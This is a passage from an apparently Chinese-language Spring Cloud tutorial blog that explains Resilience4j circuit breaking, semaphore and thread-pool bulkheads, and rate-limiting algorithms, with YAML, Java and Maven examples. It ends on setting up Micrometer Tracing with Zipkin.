class="attr">circuitbreaker:</span></span><br><span class="line">    <span class="attr">configs:</span></span><br><span class="line">      <span class="attr">default:</span></span><br><span class="line">        <span class="attr">failureRateThreshold:</span> <span class="number">50</span> <span class="comment">#设置50%的调用失败时打开断路器，超过失败请求百分⽐CircuitBreaker变为OPEN状态。</span></span><br><span class="line">        <span class="attr">slowCallDurationThreshold:</span> <span class="string">2s</span> <span class="comment">#慢调用时间阈值，高于这个阈值的视为慢调用并增加慢调用比例。</span></span><br><span class="line">        <span class="attr">slowCallRateThreshold:</span> <span class="number">30</span> <span class="comment">#慢调用百分比峰值，断路器把调用时间⼤于slowCallDurationThreshold，视为慢调用，当慢调用比例高于阈值，断路器打开，并开启服务降级</span></span><br><span class="line">        <span class="attr">slidingWindowType:</span> <span class="string">TIME_BASED</span> <span class="comment"># 滑动窗口的类型</span></span><br><span class="line">        <span class="attr">slidingWindowSize:</span> <span class="number">2</span> <span class="comment">#滑动窗口的大小配置，配置TIME_BASED表示2秒</span></span><br><span class="line">        <span class="attr">minimumNumberOfCalls:</span> <span class="number">2</span> <span class="comment">#断路器计算失败率或慢调用率之前所需的最小样本(每个滑动窗口周期)。</span></span><br><span class="line">        <span class="attr">permittedNumberOfCallsInHalfOpenState:</span> <span class="number">2</span> <span class="comment">#半开状态允许的最大请求数，默认值为10。</span></span><br><span class="line">        <span class="attr">waitDurationInOpenState:</span> <span class="string">5s</span> <span class="comment">#从OPEN到HALF_OPEN状态需要等待的时间</span></span><br><span class="line">        <span class="attr">recordExceptions:</span></span><br><span class="line">          <span class="bullet">-</span> <span class="string">java.lang.Exception</span></span><br><span class="line">    <span class="attr">instances:</span></span><br><span class="line">      <span class="attr">cloud-payment-service:</span></span><br><span class="line">        <span class="attr">baseConfig:</span> <span class="string">default</span> </span><br></pre></td></tr></table></figure>

<p><strong>步骤4：controller改造同上</strong></p>
<h3 id="服务隔离Bulkhead"><a href="#服务隔离Bulkhead" class="headerlink" title="服务隔离Bulkhead"></a>服务隔离Bulkhead</h3><p><strong>Bulkhead（舱壁隔离）</strong> 是一种服务隔离机制，用于防止资源耗尽和故障扩散。它的核心思想是将系统资源（如线程池、连接池）划分为多个独立的分区，每个分区仅服务于特定的服务或模块。即使某个服务出现高并发或故障，也只能消耗其分配的资源，而不会影响其他服务的正常运行。在微服务架构中，Bulkhead 可以通过限制每个服务的最大并发请求数或资源使用量，避免单个服务过载导致整个系统崩溃。</p>
<p><strong>Bulkhead（舱壁隔离）</strong> 的实现方式主要通过限制资源的使用量来隔离不同服务或模块的影响，以下是常见的实现方式：</p>
<ol>
<li><p><strong>线程池隔离</strong>：为每个服务或模块分配独立的线程池，确保某个服务的高并发或故障不会耗尽整个系统的线程资源。这是 Hystrix 中常用的实现方式。</p>
</li>
<li><p><strong>信号量隔离</strong>：通过设置最大并发请求数（使用计数器或信号量）来限制同时处理的请求量，避免服务过载。这种方式比线程池隔离更轻量，适合无多线程场景。</p>
</li>
<li><p><strong>连接池隔离</strong>：为数据库、外部服务等资源分配独立的连接池，防止某个服务耗尽所有连接资源。</p>
</li>
<li><p><strong>队列长度限制</strong>：限制任务队列的长度，超出部分直接拒绝请求，避免因队列过长导致系统资源被占用。</p>
</li>
</ol>
<p><strong>Resilience4J 提供了基于线程池和信号量的 Bulkhead 实现</strong>。</p>
<p><strong>配置方法：</strong></p>
<p><strong>步骤1：服务调用者模块（客户端）引入依赖</strong>（保险丝装在家里而不是国家电网）</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!--resilience4j-bulkhead--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>io.github.resilience4j<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>resilience4j-bulkhead<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>



<h4 id="基于信号量的隔离实现"><a href="#基于信号量的隔离实现" class="headerlink" title="基于信号量的隔离实现"></a>基于信号量的隔离实现</h4><p><strong>原理：</strong></p>
<ul>
<li>当信号量有空闲时，进入系统的请求会直接获取信号量并开始业务处理。</li>
<li>当信号量全被占用时，接下来的请求将会进入阻塞状态，SemaphoreBulkhead提供了一个阻塞计时器，</li>
<li>如果阻塞状态的请求在阻塞计时内无法获取到信号量则系统会拒绝这些请求。</li>
<li>若请求在阻塞计时内获取到了信号量，那将直接获取信号量并执行相应的业务处理。</li>
</ul>
<p><strong>步骤2：yaml配置文件中设置信号量等</strong></p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">resilience4j:</span></span><br><span class="line">  <span class="attr">bulkhead:</span></span><br><span class="line">    <span class="attr">configs:</span></span><br><span class="line">      <span class="attr">default:</span></span><br><span class="line">        <span class="comment"># 隔离允许并发线程执行的最大数量 默认25</span></span><br><span class="line">        <span class="attr">maxConcurrentCalls:</span> <span class="number">2</span></span><br><span class="line">        <span class="comment"># 当达到并发调用数量时，新的线程的阻塞时间，我只愿意等待1秒，过时不候进舱壁兜底fallback，默认 0</span></span><br><span class="line">        <span class="attr">maxWaitDuration:</span> <span class="string">1s</span></span><br><span class="line">    <span class="attr">instances:</span></span><br><span class="line">      <span class="attr">cloud-payment-service:</span></span><br><span class="line">        <span class="attr">baseConfig:</span> <span class="string">default</span></span><br></pre></td></tr></table></figure>

<p><strong>步骤3：改写服务调用者的Controller，使用注解<code>@Bulkhead</code>说明使用服务隔离机制的服务、服务降级的处理方法、隔离的类型（信号量）</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 使用 Bulkhead 注解为方法添加信号量类型的隔离功能。</span></span><br><span class="line"><span class="comment"> * 当调用此方法时，Resilience4j 会根据配置的 Bulkhead 规则限制并发调用数量，</span></span><br><span class="line"><span class="comment"> * 超出限制的请求将直接触发降级逻辑。</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> id 请求路径中的参数，表示具体的业务标识。</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span> 返回远程服务的响应结果或降级方法的备用结果。</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">@GetMapping(value = &quot;/feign/pay/bulkhead/&#123;id&#125;&quot;)</span></span><br><span class="line"><span class="meta">@Bulkhead(name = &quot;cloud-payment-service&quot;, fallbackMethod = &quot;myBulkheadFallback&quot;, type = Bulkhead.Type.SEMAPHORE)</span></span><br><span class="line"><span class="keyword">public</span> String <span class="title function_">myBulkhead</span><span class="params">(<span class="meta">@PathVariable(&quot;id&quot;)</span> Integer id)</span> &#123;</span><br><span class="line">    <span class="comment">// 调用 PayFeignApi 的 myBulkhead 方法发起远程服务调用。</span></span><br><span class="line">    <span class="keyword">return</span> payFeignApi.myBulkhead(id);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 当 Bulkhead 隔离规则限制被触发时，执行的降级处理方法。</span></span><br><span class="line"><span class="comment"> * 此方法会在并发调用超出限制或其他异常情况下被自动调用。</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> t 异常对象，表示导致降级的具体原因。</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span> 返回备用响应内容。</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> String <span class="title function_">myBulkheadFallback</span><span class="params">(Throwable t)</span> &#123;</span><br><span class="line">    <span class="comment">// 返回降级提示信息，告知用户系统繁忙。</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;myBulkheadFallback，隔板超出最大数量限制，系统繁忙，请稍后再试-----/(ㄒoㄒ)/~~&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>注解**<code>@Bulkhead</code>**用于定义 Bulkhead（隔板）功能，限制并发调用的数量，避免因高并发导致系统资源耗尽。参数说明如下：</p>
<ul>
<li><code>name</code>：指定 Bulkhead 的名称，便于监控和管理。这里是 <code>&quot;cloud-payment-service&quot;</code>。</li>
<li><code>fallbackMethod</code>：指定当 Bulkhead 规则限制被触发时执行的降级方法，这里是 <code>&quot;myBulkheadFallback&quot;</code>。</li>
<li><code>type</code>：定义 Bulkhead 的类型，这里使用 <code>Bulkhead.Type.SEMAPHORE</code>，即基于信号量的隔离方式。</li>
</ul>
<h4 id="基于线程池的隔离实现"><a href="#基于线程池的隔离实现" class="headerlink" title="基于线程池的隔离实现"></a>基于线程池的隔离实现</h4><p><strong>步骤2：yaml配置文件中设置线程池等</strong></p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">resilience4j:</span></span><br><span class="line">  <span class="comment"># 线程池隔离配置，用于限制方法执行的线程池大小和队列容量。</span></span><br><span class="line">  <span class="attr">thread-pool-bulkhead:</span></span><br><span class="line">    <span class="comment"># 定义通用的线程池隔离配置项。</span></span><br><span class="line">    <span class="attr">configs:</span></span><br><span class="line">      <span class="comment"># 默认配置。</span></span><br><span class="line">      <span class="attr">default:</span></span><br><span class="line">        <span class="comment"># 核心线程池大小，表示线程池中始终保持的最小线程数。</span></span><br><span class="line">        <span class="attr">core-thread-pool-size:</span> <span class="number">1</span></span><br><span class="line">        <span class="comment"># 最大线程池大小，表示线程池中允许的最大线程数。</span></span><br><span class="line">        <span class="attr">max-thread-pool-size:</span> <span class="number">1</span></span><br><span class="line">        <span class="comment"># 队列容量，表示等待执行任务的最大数量。超出此容量的任务将被拒绝并触发降级逻辑。</span></span><br><span class="line">        <span class="attr">queue-capacity:</span> <span class="number">1</span></span><br><span class="line">    <span class="comment"># 定义具体的线程池隔离实例。</span></span><br><span class="line">    <span class="attr">instances:</span></span><br><span class="line">      <span class="comment"># 名为 &quot;cloud-payment-service&quot; 的线程池隔离实例。</span></span><br><span class="line">      <span class="attr">cloud-payment-service:</span></span><br><span class="line">        <span class="comment"># 引用上述 &quot;default&quot; 配置作为基础配置。</span></span><br><span class="line">        <span class="attr">baseConfig:</span> <span class="string">default</span></span><br></pre></td></tr></table></figure>

<p>注意，配置项<code>spring-cloud-openfeign-circuitbreaker-group-enabled</code>需要为false</p>
<p>​    </p>
<p><strong>步骤3：改写服务调用者的Controller，使用注解<code>@Bulkhead</code>说明使用服务隔离机制的服务、服务降级的处理方法、隔离的类型（线程池）</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 使用 Bulkhead 注解为方法添加线程池类型的隔离功能。</span></span><br><span class="line"><span class="comment"> * 当调用此方法时，Resilience4j 会根据配置的 Bulkhead 规则限制线程池中的任务执行，</span></span><br><span class="line"><span class="comment"> * 超出限制的请求将直接触发降级逻辑。</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> id 请求路径中的参数，表示具体的业务标识。</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span> 返回一个 CompletableFuture 对象，包含远程服务的响应结果或降级方法的备用结果。</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">@GetMapping(value = &quot;/feign/pay/bulkhead/&#123;id&#125;&quot;)</span></span><br><span class="line"><span class="meta">@Bulkhead(name = &quot;cloud-payment-service&quot;, fallbackMethod = &quot;myBulkheadPoolFallback&quot;, type = Bulkhead.Type.THREADPOOL)</span></span><br><span class="line"><span class="keyword">public</span> CompletableFuture&lt;String&gt; <span class="title function_">myBulkhead</span><span class="params">(<span class="meta">@PathVariable(&quot;id&quot;)</span> Integer id)</span> &#123;</span><br><span class="line">    <span class="comment">// 打印当前线程名称，标识进入方法。</span></span><br><span class="line">    System.out.println(Thread.currentThread().getName() + <span class="string">&quot;\t&quot;</span> + <span class="string">&quot;enter the method!!!&quot;</span>);</span><br><span class="line">    <span class="comment">// 模拟耗时操作，休眠 3 秒。</span></span><br><span class="line">    <span class="keyword">try</span> &#123; TimeUnit.SECONDS.sleep(<span class="number">3</span>); &#125; <span class="keyword">catch</span> (InterruptedException e) &#123; e.printStackTrace(); &#125;</span><br><span class="line">    <span class="comment">// 打印当前线程名称，标识退出方法。</span></span><br><span class="line">    System.out.println(Thread.currentThread().getName() + <span class="string">&quot;\t&quot;</span> + <span class="string">&quot;exist the method!!!&quot;</span>);</span><br><span class="line">    <span class="comment">// 异步返回 Feign 客户端调用的结果，并附加 Bulkhead 类型信息。</span></span><br><span class="line">    <span class="keyword">return</span> CompletableFuture.supplyAsync(() -&gt; payFeignApi.myBulkhead(id) + <span class="string">&quot;\t&quot;</span> + <span class="string">&quot;Bulkhead.Type.THREADPOOL&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 当线程池型 Bulkhead 隔离规则限制被触发时，执行的降级处理方法。</span></span><br><span class="line"><span class="comment"> * 此方法会在线程池资源不足或其他异常情况下被自动调用。</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> id 请求路径中的参数，表示具体的业务标识。</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> t 异常对象，表示导致降级的具体原因。</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span> 返回一个 CompletableFuture 对象，包含备用响应内容。</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> CompletableFuture&lt;String&gt; <span class="title function_">myBulkheadPoolFallback</span><span class="params">(Integer id, Throwable t)</span> &#123;</span><br><span class="line">    <span class="comment">// 异步返回降级提示信息，告知用户系统繁忙。</span></span><br><span class="line">    <span class="keyword">return</span> CompletableFuture.supplyAsync(() -&gt; <span class="string">&quot;Bulkhead.Type.THREADPOOL，系统繁忙，请稍后再试-----/(ㄒoㄒ)/~~&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h3 id="服务限流RateLimiter"><a href="#服务限流RateLimiter" class="headerlink" title="服务限流RateLimiter"></a>服务限流RateLimiter</h3><p>常见的限流算法主要包括以下三种，各自有不同的原理和适用场景：</p>
<ol>
<li><strong>固定（滚动）窗口算法</strong>：<ul>
<li>将时间划分为固定长度的窗口（如每秒一个窗口），在每个窗口内设置请求配额。当配额用尽时，后续请求会被拒绝。优点是实现简单，但存在“突发流量”问题（窗口切换时可能瞬间超过限制）。</li>
<li>缺陷：容易出现“突发流量”问题。在窗口切换瞬间，新窗口的配额会被立即刷新，可能导致短时间内大量请求通过，超出系统承载能力。</li>
</ul>
</li>
<li><strong>滑动窗口算法</strong>：【推荐】<ul>
<li>对固定窗口算法的改进，将窗口细分为多个小片段，并按比例分配配额。例如，1秒分成10个100毫秒片段，逐步累加和释放配额，从而平滑处理突发流量。</li>
<li>实现复杂度较高，需要维护多个时间片段的状态，对存储和计算资源有一定要求。此外，虽然缓解了突发流量问题，但仍然无法完全避免极端情况下的瞬时压力</li>
</ul>
</li>
<li><strong>令牌桶算法</strong>：【最推荐】<ul>
<li>系统以固定速率向桶中添加令牌，请求来临时消耗令牌。如果桶中无令牌，则拒绝请求。该算法支持平滑流量和突发流量（桶满时可一次性消耗多令牌），<strong>适合分布式系统</strong>。</li>
<li>支持突发流量的能力可能导致短期资源占用过高，增加系统负担。如果桶的容量过大或令牌生成速率设置不当，可能无法有效限制流量。</li>
</ul>
</li>
<li><strong>漏桶算法</strong>：<ul>
<li>请求进入漏桶后，桶以固定速率流出请求。如果桶满，则多余请求被丢弃。该算法<strong>严格控制</strong>输出速率，但不支持突发流量。</li>
<li>不支持突发流量，所有请求严格按照固定速率处理，可能导致部分请求被丢弃，用户体验较差。此外，漏桶的容量和流出速率需要精心配置，否则可能影响系统性能或可用性。</li>
</ul>
</li>
</ol>
<h4 id="配置"><a href="#配置" class="headerlink" title="配置"></a>配置</h4><p><strong>步骤1：服务调用者模块（客户端）引入依赖</strong>（保险丝装在家里而不是国家电网）</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!--resilience4j-ratelimiter--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>io.github.resilience4j<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>resilience4j-ratelimiter<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p><strong>步骤2：yaml配置文件中设置限流</strong></p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">resilience4j:</span></span><br><span class="line">  <span class="attr">ratelimiter:</span></span><br><span class="line">    <span class="attr">configs:</span></span><br><span class="line">      <span class="attr">default:</span></span><br><span class="line">        <span class="comment"># 在一次刷新周期内，允许执行的最大请求数</span></span><br><span class="line">        <span class="attr">limitForPeriod:</span> <span class="number">2</span> </span><br><span class="line">        <span class="comment"># 限流器每隔limitRefreshPeriod刷新一次，将允许处理的最大请求数量重置为limitForPeriod</span></span><br><span class="line">        <span class="attr">limitRefreshPeriod:</span> <span class="string">1s</span> </span><br><span class="line">        <span class="comment"># 线程等待权限的默认等待时间</span></span><br><span class="line">        <span class="attr">timeout-duration:</span> <span class="number">1</span> </span><br><span class="line">    <span class="attr">instances:</span></span><br><span class="line">        <span class="attr">cloud-payment-service:</span></span><br><span class="line">          <span class="attr">baseConfig:</span> <span class="string">default</span></span><br></pre></td></tr></table></figure>

<p><strong>步骤3：改写服务调用者的Controller，使用注解<code>@RateLimiter</code>说明使用服务隔离机制的服务、服务降级的处理方法</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@RateLimiter(name = &quot;cloud-payment-service&quot;,fallbackMethod = &quot;myRatelimitFallback&quot;)</span></span><br></pre></td></tr></table></figure>



<hr>
<h2 id="Sleuth-Micrometer-ZipKin分布式链路追踪"><a href="#Sleuth-Micrometer-ZipKin分布式链路追踪" class="headerlink" title="Sleuth(Micrometer)+ZipKin分布式链路追踪"></a>Sleuth(Micrometer)+ZipKin分布式链路追踪</h2><h3 id="简介-4"><a href="#简介-4" class="headerlink" title="简介"></a>简介</h3><p>Sleuth当前已经停止维护，且不支持SpringBoot3，建议使用<code>Micrometer Tracing</code>。</p>
<p><a href="https://docs.micrometer.io/">官网文档</a>    <a href="https://github.com/micrometer-metrics/tracing">源码</a></p>
<p>在微服务框架中，一个由客户端发起的请求在后端系统中会经过多个不同的的服务节点调用来协同产生最后的请求结果，每一个前段请求都会形成一条复杂的分布式服务调用链路，链路中的任何一环出现高延时或错误都会引起整个请求最后的失败。</p>
<p>在分布式与微服务场景下，我们需要解决如下问题：</p>
<p>在大规模分布式与微服务集群下，如何实时观测系统的整体调用链路情况、如何快速发现并定位到问题、如何尽可能精确的判断故障对系统的影响范围与影响程度、如何尽可能精确的梳理出服务之间的依赖关系，并判断出服务之间的依赖关系是否合理、如何尽可能精确的分析整个系统调用链路的性能与瓶颈点、，如何尽可能精确的分析系统的存储瓶颈与容量规划。</p>
<p>分布式链路追踪技术要解决的问题：分布式链路追踪（Distributed Tracing），就是将一次分布式请求还原成调用链路，进行日志记录，性能监控并将一次分布式请求的调用情况集中展示。比如各个服务节点上的耗时、请求具体到达哪台机器上、每个服务节点的请求状态等等。</p>
<h4 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h4><p><img src="https://raw.githubusercontent.com/Fushiye/BlogPicture/main/img_blog/20250225214358.png"></p>
<h3 id="图形化展示工具Zipkin"><a href="#图形化展示工具Zipkin" class="headerlink" title="图形化展示工具Zipkin"></a>图形化展示工具Zipkin</h3><p><a href="https://zipkin.io/">官网</a>		<a href="https://zipkin.io/pages/quickstart.html">下载安装教程</a></p>
<p>运行：</p>
<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">java -jar zipkin-server-<span class="number">3</span>.<span class="number">0</span>.<span class="number">0</span>-rc0-exec.jar</span><br></pre></td></tr></table></figure>





<h3 id="分布式链路追踪配置"><a href="#分布式链路追踪配置" class="headerlink" title="分布式链路追踪配置"></a>分布式链路追踪配置</h3><p><strong>步骤1：修改父工程POM文件，添加依赖</strong></p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">properties</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- 其他省略 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">micrometer-tracing.version</span>&gt;</span>1.2.0<span class="tag">&lt;/<span class="name">micrometer-tracing.version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">micrometer-observation.version</span>&gt;</span>1.12.0<span class="tag">&lt;/<span class="name">micrometer-observation.version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">feign-micrometer.version</span>&gt;</span>12.5<span class="tag">&lt;/<span class="name">feign-micrometer.version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">zipkin-reporter-brave.version</span>&gt;</span>2.17.0<span class="tag">&lt;/<span class="name">zipkin-reporter-brave.version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">properties</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependencies</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- 其他省略 --&gt;</span></span><br><span class="line">    <span class="comment">&lt;!--micrometer-tracing-bom导入链路追踪版本中心  1--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>io.micrometer<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>micrometer-tracing-bom<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">version</span>&gt;</span>$&#123;micrometer-tracing.version&#125;<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">type</span>&gt;</span>pom<span class="tag">&lt;/<span class="name">type</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">scope</span>&gt;</span>import<span class="tag">&lt;/<span class="name">scope</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!--micrometer-tracing指标追踪   2--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>io.micrometer<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>micrometer-tracing<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">version</span>&gt;</span>$&#123;micrometer-tracing.version&#125;<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!--micrometer-tracing-bridge-brave适配zipkin的桥接包 3--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>io.micrometer<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>micrometer-tracing-bridge-brave<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">version</span>&gt;</span>$&#123;micrometer-tracing.version&#125;<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!--micrometer-observation 4--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>io.micrometer<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>micrometer-observation<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">version</span>&gt;</span>$&#123;micrometer-observation.version&#125;<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!--feign-micrometer 5--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>io.github.openfeign<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>feign-micrometer<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">version</span>&gt;</span>$&#123;feign-micrometer.version&#125;<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!--zipkin-reporter-brave 6--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>io.zipkin.reporter2<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>zipkin-reporter-brave<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">version</span>&gt;</span>$&#123;zipkin-reporter-brave.version&#125;<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependencies</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p><strong>步骤2：服务调用、提供子模块均引入依赖</strong></p>
<p>一般是调用模块需要，但不排除未来提供者模块也可能调用其他模块</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!--micrometer-tracing指标追踪  1--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>io.micrometer<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>micrometer-tracing<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--micrometer-tracing-bridge-brave适配zipkin的桥接包 2--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>io.micrometer<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>micrometer-tracing-bridge-brave<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--micrometer-observation 3--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>io.micrometer<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>micrometer-observation<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--feign-micrometer 4--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>io.github.openfeign<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>feign-micrometer<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--zipkin-reporter-brave 5--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>io.zipkin.reporter2<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>zipkin-reporter-brave<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p><strong>步骤3：子模块编写yaml配置信息</strong></p>
